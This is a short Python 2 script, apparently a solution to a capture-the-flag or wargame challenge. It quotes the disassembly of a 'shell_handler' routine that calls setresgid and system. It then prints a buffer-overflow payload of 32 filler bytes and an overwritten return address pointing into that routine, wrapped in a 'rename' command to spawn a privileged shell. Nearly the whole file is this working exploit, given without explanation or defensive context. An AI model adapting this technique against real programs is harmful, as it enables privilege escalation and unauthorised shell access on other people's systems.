from struct import pack

"""
   0x080489d7 <+17>:	call   0x8048600 <getegid@plt>
   0x080489dc <+22>:	mov    %eax,-0xc(%ebp)
   0x080489df <+25>:	mov    -0xc(%ebp),%eax
   0x080489e2 <+28>:	mov    %eax,0x8(%esp)
   0x080489e6 <+32>:	mov    -0xc(%ebp),%eax
   0x080489e9 <+35>:	mov    %eax,0x4(%esp)
   0x080489ed <+39>:	mov    -0xc(%ebp),%eax
   0x080489f0 <+42>:	mov    %eax,(%esp)
   0x080489f3 <+45>:	call   0x80486a0 <setresgid@plt>
   0x080489f8 <+50>:	movl   $0x8048ea3,(%esp)
   0x080489ff <+57>:	call   0x8048630 <system@plt>
   0x08048a04 <+62>:	jmp    0x8048a12 <shell_handler+76>
   0x08048a06 <+64>:	movl   $0x8048eab,(%esp)
   0x08048a0d <+71>:	call   0x8048620 <puts@plt>
   0x08048a12 <+76>:	leave
   0x08048a13 <+77>:	ret
"""

cmd = 'A'*32 + pack('<I', 0x080489d7)
print 'rename lol ' + cmd
print cmd + ' b'
